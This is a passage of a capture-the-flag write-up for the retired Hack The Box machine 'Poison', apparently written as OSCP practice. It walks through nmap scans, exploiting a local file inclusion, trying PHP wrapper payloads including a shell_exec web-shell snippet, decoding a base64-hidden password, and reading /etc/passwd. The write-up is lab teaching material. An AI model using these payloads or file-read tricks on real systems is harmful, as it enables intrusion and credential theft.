<!-- Fix MathJax rendering on iOS Safari due to rendering long numbers as phone numbers. -->




<!doctype html>
<html lang="en" class="no-js">
  <head>
    
	
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      <meta http-equiv="x-ua-compatible" content="ie=edge">
      
        <meta name="description" content="A compilation of writeups for the website- [**https://www.hackthebox.eu/](https://www.hackthebox.eu/**).">
      
      
        <link rel="canonical" href="http://hackthebox-solutions.github.io/Retired/Poison Writeup wo Metasploit/">
      
      
        <meta name="author" content="Rushi Chaudhari">
      
      
        <meta name="lang:clipboard.copy" content="Copy to clipboard">
      
        <meta name="lang:clipboard.copied" content="Copied to clipboard">
      
        <meta name="lang:search.language" content="en">
      
        <meta name="lang:search.pipeline.stopwords" content="True">
      
        <meta name="lang:search.pipeline.trimmer" content="True">
      
        <meta name="lang:search.result.none" content="No matching documents">
      
        <meta name="lang:search.result.one" content="1 matching document">
      
        <meta name="lang:search.result.other" content="# matching documents">
      
        <meta name="lang:search.tokenizer" content="[\s\-]+">
      
      <link rel="shortcut icon" href="../../assets/favicon.png">
      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-4.6.0">
    
	<meta name="format-detection" content="telephone=no">

    
      
        <title>8. Poison Writeup w/o Metasploit.md - Hackthebox Solutions</title>
      
    
    
      <link rel="stylesheet" href="../../assets/stylesheets/application.1b62728e.css">
      
        <link rel="stylesheet" href="../../assets/stylesheets/application-palette.a8b3c06d.css">
      
      
        
        
        <meta name="theme-color" content="#009688">
      
    
    
      <script src="../../assets/javascripts/modernizr.268332fc.js"></script>
    
    
      
        <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700%7CRoboto+Mono&display=fallback">
        <style>body,input{font-family:"Roboto","Helvetica Neue",Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Roboto Mono","Courier New",Courier,monospace}</style>
      
    
    <link rel="stylesheet" href="../../assets/fonts/material-icons.css">
    
    
      <link rel="stylesheet" href="../../css/katex.css">
    
      <link rel="stylesheet" href="../../css/custom.css">
    
      <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/katex.min.css">
    
    
      
    
    
  </head>
  
    
    
    <body dir="ltr" data-md-color-primary="teal" data-md-color-accent="blue">
  
    <svg class="md-svg">
      <defs>
        
        
          <svg xmlns="http://www.w3.org/2000/svg" width="416" height="448" viewBox="0 0 416 448" id="__github"><path fill="currentColor" d="M160 304q0 10-3.125 20.5t-10.75 19T128 352t-18.125-8.5-10.75-19T96 304t3.125-20.5 10.75-19T128 256t18.125 8.5 10.75 19T160 304zm160 0q0 10-3.125 20.5t-10.75 19T288 352t-18.125-8.5-10.75-19T256 304t3.125-20.5 10.75-19T288 256t18.125 8.5 10.75 19T320 304zm40 0q0-30-17.25-51T296 232q-10.25 0-48.75 5.25Q229.5 240 208 240t-39.25-2.75Q130.75 232 120 232q-29.5 0-46.75 21T56 304q0 22 8 38.375t20.25 25.75 30.5 15 35 7.375 37.25 1.75h42q20.5 0 37.25-1.75t35-7.375 30.5-15 20.25-25.75T360 304zm56-44q0 51.75-15.25 82.75-9.5 19.25-26.375 33.25t-35.25 21.5-42.5 11.875-42.875 5.5T212 416q-19.5 0-35.5-.75t-36.875-3.125-38.125-7.5-34.25-12.875T37 371.5t-21.5-28.75Q0 312 0 260q0-59.25 34-99-6.75-20.5-6.75-42.5 0-29 12.75-54.5 27 0 47.5 9.875t47.25 30.875Q171.5 96 212 96q37 0 70 8 26.25-20.5 46.75-30.25T376 64q12.75 25.5 12.75 54.5 0 21.75-6.75 42 34 40 34 99.5z"/></svg>
        
      </defs>
    </svg>
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" data-md-component="overlay" for="__drawer"></label>
    
      <a href="#reconnaissance" tabindex="1" class="md-skip">
        Skip to content
      </a>
    
    
      <header class="md-header" data-md-component="header">
  <nav class="md-header-nav md-grid">
    <div class="md-flex">
      <div class="md-flex__cell md-flex__cell--shrink">
        <a href="http://hackthebox-solutions.github.io" title="Hackthebox Solutions" class="md-header-nav__button md-logo">
          
            <i class="md-icon"></i>
          
        </a>
      </div>
      <div class="md-flex__cell md-flex__cell--shrink">
        <label class="md-icon md-icon--menu md-header-nav__button" for="__drawer"></label>
      </div>
      <div class="md-flex__cell md-flex__cell--stretch">
        <div class="md-flex__ellipsis md-header-nav__title" data-md-component="title">
          
            <span class="md-header-nav__topic">
              Hackthebox Solutions
            </span>
            <span class="md-header-nav__topic">
              
                8. Poison Writeup w/o Metasploit.md
              
            </span>
          
        </div>
      </div>
      <div class="md-flex__cell md-flex__cell--shrink">
        
          <label class="md-icon md-icon--search md-header-nav__button" for="__search"></label>
          
<div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="query" data-md-state="active">
      <label class="md-icon md-search__icon" for="__search"></label>
      <button type="reset" class="md-icon md-search__icon" data-md-component="reset" tabindex="-1">
        &#xE5CD;
      </button>
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="result">
          <div class="md-search-result__meta">
            Type to start searching
          </div>
          <ol class="md-search-result__list"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
        
      </div>
      
        <div class="md-flex__cell md-flex__cell--shrink">
          <div class="md-header-nav__source">
            


  

<a href="https://github.com/hackthebox-solutions/hackthebox-solutions.github.io/" title="Go to repository" class="md-source" data-md-source="github">
  
    <div class="md-source__icon">
      <svg viewBox="0 0 24 24" width="24" height="24">
        <use xlink:href="#__github" width="24" height="24"></use>
      </svg>
    </div>
  
  <div class="md-source__repository">
    hackthebox-solutions.github.io
  </div>
</a>
          </div>
        </div>
      
    </div>
  </nav>
</header>
    
    <div class="md-container">
      
        
      
      
      <main class="md-main" role="main">
        <div class="md-main__inner md-grid" data-md-component="container">
          
            
              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    <nav class="md-nav md-nav--primary" data-md-level="0">
  <label class="md-nav__title md-nav__title--site" for="__drawer">
    <a href="http://hackthebox-solutions.github.io" title="Hackthebox Solutions" class="md-nav__button md-logo">
      
        <i class="md-icon"></i>
      
    </a>
    Hackthebox Solutions
  </label>
  
    <div class="md-nav__source">
      


  

<a href="https://github.com/hackthebox-solutions/hackthebox-solutions.github.io/" title="Go to repository" class="md-source" data-md-source="github">
  
    <div class="md-source__icon">
      <svg viewBox="0 0 24 24" width="24" height="24">
        <use xlink:href="#__github" width="24" height="24"></use>
      </svg>
    </div>
  
  <div class="md-source__repository">
    hackthebox-solutions.github.io
  </div>
</a>
    </div>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
      


  <li class="md-nav__item">
    <a href="../.." title="Preface" class="md-nav__link">
      Preface
    </a>
  </li>

    
      
      
      

  


  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2" type="checkbox" id="nav-2" checked>
    
    <label class="md-nav__link" for="nav-2">
      I Retired
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-2">
        I Retired
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../Access Writeup/" title="1. Access Writeup.md" class="md-nav__link">
      1. Access Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Jerry Writeup/" title="2. Jerry Writeup.md" class="md-nav__link">
      2. Jerry Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Blue Writeup wo Metasploit/" title="3. Blue Writeup w/o Metasploit.md" class="md-nav__link">
      3. Blue Writeup w/o Metasploit.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Blocky Writeup/" title="4. Blocky Writeup.md" class="md-nav__link">
      4. Blocky Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Calamity Writeup/" title="5. Calamity Writeup.md" class="md-nav__link">
      5. Calamity Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Devoops Writeup/" title="6. Devoops Writeup.md" class="md-nav__link">
      6. Devoops Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Apocalyst Writeup/" title="7. Apocalyst Writeup.md" class="md-nav__link">
      7. Apocalyst Writeup.md
    </a>
  </li>

        
          
          
          

  


  <li class="md-nav__item md-nav__item--active">
    
    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="__toc">
    
      
    
    
    <a href="./" title="8. Poison Writeup w/o Metasploit.md" class="md-nav__link md-nav__link--active">
      8. Poison Writeup w/o Metasploit.md
    </a>
    
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Postman Writeup/" title="9. Postman Writeup.md" class="md-nav__link">
      9. Postman Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Beep Writeup/" title="10. Beep Writeup.md" class="md-nav__link">
      10. Beep Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Help Writeup/" title="11. Help Writeup.md" class="md-nav__link">
      11. Help Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Mirai Writeup/" title="12. Mirai Writeup.md" class="md-nav__link">
      12. Mirai Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Curling Writeup/" title="13. Curling Writeup.md" class="md-nav__link">
      13. Curling Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Nibbles Writeup wo Metasploit/" title="14. Nibbles Writeup w/o Metasploit.md" class="md-nav__link">
      14. Nibbles Writeup w/o Metasploit.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Valentine Writeup wo Metasploit/" title="15. Valentine Writeup w/o Metasploit.md" class="md-nav__link">
      15. Valentine Writeup w/o Metasploit.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Popcorn Writeups/" title="16. Popcorn Writeups.md" class="md-nav__link">
      16. Popcorn Writeups.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Cronos Writeup/" title="17. Cronos Writeup.md" class="md-nav__link">
      17. Cronos Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Legacy Writeup/" title="18. Legacy Writeup.md" class="md-nav__link">
      18. Legacy Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Openadmin Writeup/" title="19. Openadmin Writeup.md" class="md-nav__link">
      19. Openadmin Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Bank Writeup/" title="20. Bank Writeup.md" class="md-nav__link">
      20. Bank Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Shocker Writeup wo Metasploit/" title="21. Shocker Writeup w/o Metasploit.md" class="md-nav__link">
      21. Shocker Writeup w/o Metasploit.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Luke Writeup/" title="22. Luke Writeup.md" class="md-nav__link">
      22. Luke Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Arctic Writeup wo Metasploit/" title="23. Arctic Writeup w/o Metasploit.md" class="md-nav__link">
      23. Arctic Writeup w/o Metasploit.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Granny Writeup/" title="24. Granny Writeup.md" class="md-nav__link">
      24. Granny Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Netmon Writeup/" title="25. Netmon Writeup.md" class="md-nav__link">
      25. Netmon Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Sense Writeup wo Metasploit/" title="26. Sense Writeup w/o Metasploit.md" class="md-nav__link">
      26. Sense Writeup w/o Metasploit.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Sunday Writeup wo Metasploit/" title="27. Sunday Writeup w/o Metasploit.md" class="md-nav__link">
      27. Sunday Writeup w/o Metasploit.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Solidstate Writeup wo Metasploit/" title="28. Solidstate Writeup w/o Metasploit.md" class="md-nav__link">
      28. Solidstate Writeup w/o Metasploit.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Celestial Writeup/" title="29. Celestial Writeup.md" class="md-nav__link">
      29. Celestial Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Tenten Writeup/" title="30. Tenten Writeup.md" class="md-nav__link">
      30. Tenten Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Optimum Writeup/" title="31. Optimum Writeup.md" class="md-nav__link">
      31. Optimum Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Haircut Writeup/" title="32. Haircut Writeup.md" class="md-nav__link">
      32. Haircut Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Irked Writeup/" title="33. Irked Writeup.md" class="md-nav__link">
      33. Irked Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Chatterbox Writeup wo Metasploit/" title="34. Chatterbox Writeup w/o Metasploit.md" class="md-nav__link">
      34. Chatterbox Writeup w/o Metasploit.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Bashed Writeup/" title="35. Bashed Writeup.md" class="md-nav__link">
      35. Bashed Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Lame Writeup/" title="36. Lame Writeup.md" class="md-nav__link">
      36. Lame Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Grandpa Writeup/" title="37. Grandpa Writeup.md" class="md-nav__link">
      37. Grandpa Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Swagshop Writeup/" title="38. Swagshop Writeup.md" class="md-nav__link">
      38. Swagshop Writeup.md
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    
<nav class="md-nav md-nav--secondary">
  
  
    
  
  
</nav>
                  </div>
                </div>
              </div>
            
          
          <div class="md-content">
            <article class="md-content__inner md-typeset">
              
                
                  <a href="https://github.com/hackthebox-solutions/hackthebox-solutions.github.io/edit/master/docs/Retired/Poison Writeup wo Metasploit.md" title="Edit this page" class="md-icon md-content__icon">&#xE3C9;</a>
                
                
                <p><img alt="" src="../../img/Poison Writeup wo Metasploit/1_N-q7Pj36SfSkKnJZct4Y3Q.png" /></p>
<p>This is the 21st blog out of a series of blogs I will be publishing on retired HTB machines in preparation for the OSCP. The full list of OSCP like machines compiled by <a href="https://twitter.com/TJ_Null">TJ_Null</a> can be found <a href="https://docs.google.com/spreadsheets/u/1/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/htmlview#">here</a>.</p>
<p>Let’s get started!</p>
<h1 id="reconnaissance">Reconnaissance</h1>
<p>First thing first, we run a quick initial nmap scan to see which ports are open and which services are running on those ports.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>nmap -sC -sV -O -oA initial 10.10.10.84
</pre></div>

<ul>
<li>
<p><strong>-sC</strong>: run default nmap scripts</p>
</li>
<li>
<p><strong>-sV</strong>: detect service version</p>
</li>
<li>
<p><strong>-O</strong>: detect OS</p>
</li>
<li>
<p><strong>-oA</strong>: output all formats and store in file <em>initial</em></p>
</li>
</ul>
<p>We get back the following result showing that 2 ports are open:</p>
<ul>
<li>
<p><strong>Port 22: </strong>running OpenSSH 7.2</p>
</li>
<li>
<p><strong>Port 80: </strong>running Apache httpd 2.4.29</p>
</li>
</ul>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos=" 1 "></span>Starting Nmap 7.80 ( [https://nmap.org](https://nmap.org) ) at 2020-01-03 22:13 EST
<span class="lineno" data-linenos=" 2 "></span>Nmap scan report for 10.10.10.84
<span class="lineno" data-linenos=" 3 "></span>Host is up (0.031s latency).
<span class="lineno" data-linenos=" 4 "></span>Not shown: 998 closed ports
<span class="lineno" data-linenos=" 5 "></span>PORT   STATE SERVICE VERSION
<span class="lineno" data-linenos=" 6 "></span>22/tcp open  ssh     OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0)
<span class="lineno" data-linenos=" 7 "></span>| ssh-hostkey:
<span class="lineno" data-linenos=" 8 "></span>|   2048 e3:3b:7d:3c:8f:4b:8c:f9:cd:7f:d2:3a:ce:2d:ff:bb (RSA)
<span class="lineno" data-linenos=" 9 "></span>|   256 4c:e8:c6:02:bd:fc:83:ff:c9:80:01:54:7d:22:81:72 (ECDSA)
<span class="lineno" data-linenos="10 "></span>|_  256 0b:8f:d5:71:85:90:13:85:61:8b:eb:34:13:5f:94:3b (ED25519)
<span class="lineno" data-linenos="11 "></span>80/tcp open  http    Apache httpd 2.4.29 ((FreeBSD) PHP/5.6.32)
<span class="lineno" data-linenos="12 "></span>|_http-server-header: Apache/2.4.29 (FreeBSD) PHP/5.6.32
<span class="lineno" data-linenos="13 "></span>|_http-title: Site doesn&#39;t have a title (text/html; charset=UTF-8).
<span class="lineno" data-linenos="14 "></span>No exact OS matches for host (If you know what OS is running on it, see [https://nmap.org/submit/](https://nmap.org/submit/) ).
<span class="lineno" data-linenos="15 "></span>TCP/IP fingerprint:
<span class="lineno" data-linenos="16 "></span>OS:SCAN(V=7.80%E=4%D=1/3%OT=22%CT=1%CU=35958%PV=Y%DS=2%DC=I%G=Y%TM=5E1002E4
<span class="lineno" data-linenos="17 "></span>.....
<span class="lineno" data-linenos="18 "></span>Network Distance: 2 hops
<span class="lineno" data-linenos="19 "></span>Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd
<span class="lineno" data-linenos="20 "></span>
<span class="lineno" data-linenos="21 "></span>OS and Service detection performed. Please report any incorrect results at [https://nmap.org/submit/](https://nmap.org/submit/) .
<span class="lineno" data-linenos="22 "></span>Nmap done: 1 IP address (1 host up) scanned in 28.65 seconds
</pre></div>

<p>Before we start investigating these ports, let’s run more comprehensive nmap scans in the background to make sure we cover all bases.</p>
<p>Let’s run an nmap scan that covers all ports.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>nmap -sC -sV -p- -oA full 10.10.10.84
</pre></div>

<p>No other ports are open.</p>
<p>Similarly, we run an nmap scan with the <strong>-sU </strong>flag enabled to run a UDP scan.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>nmap -sU -p- -oA udp 10.10.10.84
</pre></div>

<p>We get back the following result showing that no other ports are open.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>Starting Nmap 7.80 ( [https://nmap.org](https://nmap.org) ) at 2020-01-03 22:16 EST
<span class="lineno" data-linenos="2 "></span>Nmap scan report for 10.10.10.84
<span class="lineno" data-linenos="3 "></span>Host is up (0.034s latency).
<span class="lineno" data-linenos="4 "></span>Not shown: 65534 closed ports
<span class="lineno" data-linenos="5 "></span>PORT    STATE         SERVICE
<span class="lineno" data-linenos="6 "></span>514/udp open|filtered syslog
<span class="lineno" data-linenos="7 "></span>
<span class="lineno" data-linenos="8 "></span>Nmap done: 1 IP address (1 host up) scanned in 3340.51 seconds
</pre></div>

<p>Before we move on to enumeration, let’s make some mental notes about the nmap scan results.</p>
<ul>
<li>
<p>The OpenSSH version that is running on port 22 is not associated with any critical vulnerabilities, so it’s unlikely that we gain initial access through this port, unless we find credentials.</p>
</li>
<li>
<p>Ports 80 is running a web server, so we’ll perform our standard enumeration techniques on it.</p>
</li>
</ul>
<h1 id="enumeration">Enumeration</h1>
<p>I always start off with enumerating HTTP first.</p>
<p><strong>Port 80</strong></p>
<p>Visit the application in the browser.</p>
<p><img alt="" src="../../img/Poison Writeup wo Metasploit/1_6vTsCaMX9HFDrTmZbFnvcA.png" /></p>
<p>It’s a simple website that takes in a script name and executes it. We’re given a list of scripts to test, so let’s test them one by one. The ini.php &amp; info.php scripts don’t give us anything useful. The phpinfo.php script gives us a wealth of information on the PHP server configuration. The listfiles.php script gives us the following output.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos=" 1 "></span>Array
<span class="lineno" data-linenos=" 2 "></span>(
<span class="lineno" data-linenos=" 3 "></span>    [0] =&gt; .
<span class="lineno" data-linenos=" 4 "></span>    [1] =&gt; ..
<span class="lineno" data-linenos=" 5 "></span>    [2] =&gt; browse.php
<span class="lineno" data-linenos=" 6 "></span>    [3] =&gt; index.php
<span class="lineno" data-linenos=" 7 "></span>    [4] =&gt; info.php
<span class="lineno" data-linenos=" 8 "></span>    [5] =&gt; ini.php
<span class="lineno" data-linenos=" 9 "></span>    [6] =&gt; listfiles.php
<span class="lineno" data-linenos="10 "></span>    [7] =&gt; phpinfo.php
<span class="lineno" data-linenos="11 "></span>    [8] =&gt; pwdbackup.txt
<span class="lineno" data-linenos="12 "></span>)
</pre></div>

<p>The pwdbackup.txt file looks interesting. Let’s see if we can view it in the application.</p>
<p><img alt="" src="../../img/Poison Writeup wo Metasploit/1_d0IU2Te57a2xHqS257inVA.png" /></p>
<p>We get the following output.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>This password is secure, it&#39;s encoded atleast 13 times.. what could go wrong really..
<span class="lineno" data-linenos="2 "></span>
<span class="lineno" data-linenos="3 "></span>Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVUbGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBSbVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVWM040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRsWmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYyeG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01GWkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYwMXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVaT1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5kWFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZkWGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZTVm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZzWkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBWVmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpOUkd4RVdub3dPVU5uUFQwSwo=
</pre></div>

<p>Based on the output, we can deduce that the application is not validating user input and therefore is vulnerable to local file inclusion (LFI). Based on the comment, this file includes a password that is encoded. Before we go down the route of decoding the password and trying to SSH into an account using it, let’s see if we can turn the LFI into a remote file inclusion (RFI).</p>
<p>There are several methods we can try.</p>
<p><strong>PHP http:// Wrapper</strong></p>
<p>The PHP http wrapper allows you to access URLs. The syntax of the exploit is:</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>http://[path-to-remote-file]
</pre></div>

<p>Start a simple python server.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>python -m SimpleHTTPServer 5555
</pre></div>

<p>Attempt to run a file hosted on the server.</p>
<p><img alt="" src="../../img/Poison Writeup wo Metasploit/1_XRX5FZPgJIMgfw_c-ayQHw.png" /></p>
<p>We get an error informing us that the http:// wrapper is disabled. Similarly, we can try ftp:// but that is also disabled.</p>
<p><strong>PHP expect:// Wrapper</strong></p>
<p>The PHP expect wrapper allows you to run system commands. The syntax of the exploit is:</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>expect://[command]
</pre></div>

<p>This functionality is not enabled by default so let’s check if our application has it enabled. Intercept the request using Burp and attempt to run the ‘id’ command.</p>
<p><img alt="" src="../../img/Poison Writeup wo Metasploit/1_6jejQhxQb7v7xX4PHQ0fQg.png" /></p>
<p>We get an error informing us that the PHP expect wrapper is not configured.</p>
<p><strong>PHP input:// Wrapper</strong></p>
<p>The input:// wrapper allows you to read raw data from the request body. Therefore, you can use it to send a payload via POST request. The syntax for the request would be:</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>php://input&amp;cmd=[command]
</pre></div>

<p>The syntax for post data would be:</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>&lt;?php echo shell_exec($GET[&#39;cmd&#39;]); ?&gt;
</pre></div>

<p>This doesn’t work for our request, but I thought it was worth mentioning. There are several other techniques you can try that are not mentioned in this blog. However, I’m confident that the application is not vulnerable to RFI so I’m going to move on.</p>
<p>One useful technique you should know is how to view the source code of files using the filter:// wrapper.</p>
<p><strong>PHP filter:// Wrapper</strong></p>
<p>When a file such as index.php is executed, the page only show the output of the script. To view the source code, you can use the filter:// wrapper.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>php://filter/convert.base64-encode/resource=[file-name]
</pre></div>

<p>This will encode the page in base64 and output the encoded string.</p>
<p>For example, to view the ini.php file, run the below command.</p>
<p><img alt="" src="../../img/Poison Writeup wo Metasploit/1_ENEGB6rnCEqDsHKGCKAoEg.png" /></p>
<p>This gives you a base64 encoded version of the source code. Decode the string.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>echo &quot;PD9waHAKcHJpbnRfcihpbmlfZ2V0X2FsbCgpKTsKPz4K&quot; | base64 --decode
</pre></div>

<p>You get the source code.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>&lt;?php
<span class="lineno" data-linenos="2 "></span>print_r(ini_get_all());
<span class="lineno" data-linenos="3 "></span>?&gt;
</pre></div>

<p>We diverged a little bit from solving this machine, the conclusion of all the above testing is that it is not vulnerable to an RFI. So let’s move on to gaining an initial foothold on the system.</p>
<h1 id="initial-foothold">Initial Foothold</h1>
<p>Gaining an initial foothold can be done in three ways.</p>
<ul>
<li>
<p>Decode the pwdbackup.txt file and use the decoded password to SSH into a user’s account.</p>
</li>
<li>
<p>Race condition exploit in phpinfo.php file that turns the LFI to an RCE.</p>
</li>
<li>
<p>Log poisoning exploit that turns the LFI to an RCE.</p>
</li>
</ul>
<p>I initially got access to the machine using method 1 and then exploited methods 2 &amp; 3 after watching <a href="https://www.youtube.com/watch?v=rs4zEwONzzk">ippsec’s video</a>.</p>
<p><strong>Method 1: pwdbackup.txt</strong></p>
<p>The output of the pwdbackup.txt file gives us a hint that the password is encoded at least 13 times, so let’s write a simple bash script to decode it.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>#!/bin/bash
<span class="lineno" data-linenos="2 "></span>
<span class="lineno" data-linenos="3 "></span># secret.txt contains encoded text
<span class="lineno" data-linenos="4 "></span>secret=$(&lt;secret.txt)
<span class="lineno" data-linenos="5 "></span>
<span class="lineno" data-linenos="6 "></span>for i in {1..13}; do
<span class="lineno" data-linenos="7 "></span>        secret=$(&lt;&lt;&lt;&quot;$secret&quot; base64 --decode)
<span class="lineno" data-linenos="8 "></span>done
<span class="lineno" data-linenos="9 "></span>echo &quot;$secret&quot;
</pre></div>

<p>Save the script in a file called decode.sh and run it.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>root@kali:~/Desktop/htb/poison# ./decode.sh
<span class="lineno" data-linenos="2 "></span>Charix!2#4%6&amp;8(0
</pre></div>

<p>We get back a password. We want to try this password to SSH into a user’s account, however, we don’t have a username. Let’s try and get that using the LFI vulnerability. Enter the following string in the Scriptname field to output the /etc/passwd file.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>/etc/passwd
</pre></div>

<p>We get back the following data (truncated).</p>
